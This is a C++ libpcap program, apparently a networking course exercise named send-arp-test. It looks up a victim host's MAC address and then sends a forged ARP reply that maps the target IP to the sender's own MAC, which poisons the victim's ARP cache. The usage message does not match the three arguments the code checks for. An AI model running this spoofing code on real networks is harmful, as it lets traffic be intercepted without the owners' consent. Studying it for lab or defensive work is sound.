#include <cstdio>
#include <pcap.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"
#include "mylibnet.h"
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void sendARP(pcap_t* handle, char* senderIP, char* targetIP, char* senderMAC, char* myMAC){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(senderMAC);   // sender
    packet.eth_.smac_ = Mac(myMAC);   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(myMAC);   //me
    packet.arp_.sip_ = htonl(Ip(targetIP)); // target
    packet.arp_.tmac_ = Mac(senderMAC);   // sender
    packet.arp_.tip_ = htonl(Ip(senderIP));    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void sendRequest(pcap_t* handle, char* senderAddress, char* targetAddress, char* myMAC){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // sender
    packet.eth_.smac_ = Mac(myMAC);   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(myMAC);   //me
    packet.arp_.sip_ = htonl(Ip(targetAddress)); // target
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // sender
    packet.arp_.tip_ = htonl(Ip(senderAddress));    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}


void getSenderMAC(pcap_t* handle, u_int8_t* senderIP, u_int8_t* senderEther, char* strSender, char*strTarget, char* myMAC){
    while (true) {
        sendRequest(handle, strSender, strTarget, myMAC);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ether_header ether = getEther(packet);
        ip_header ip = getIp(packet);

        if(!(ether.type[0] == 0x08 && ether.type[1] == 0x06)) continue;
        int i;
        for(i = 0; i < 4; i++)
            if(ip.sender[i] != senderIP[i]) break;
        if(i != 4) continue;
        for(int i = 0; i < 6; i++)
            senderEther[i] = ether.src[i];

        break;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    char myMAC[18];
    u_int8_t sender[4]; changeType2Int(argv[2], sender);
    u_int8_t target[4]; changeType2Int(argv[3], target);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;

    }

    myMAC[17] = '\0';
    getMAC(dev, myMAC);
    u_int8_t senderEth[6]; getSenderMAC(handle, sender, senderEth, argv[2], argv[3], myMAC);
    char strEth[18];
    strEth[17] = '\0';
    changeHex2String(senderEth, strEth);
    sendARP(handle, argv[2], argv[3], strEth, myMAC);

    printf("Finished send ARP packet!\n");

    pcap_close(handle);
}
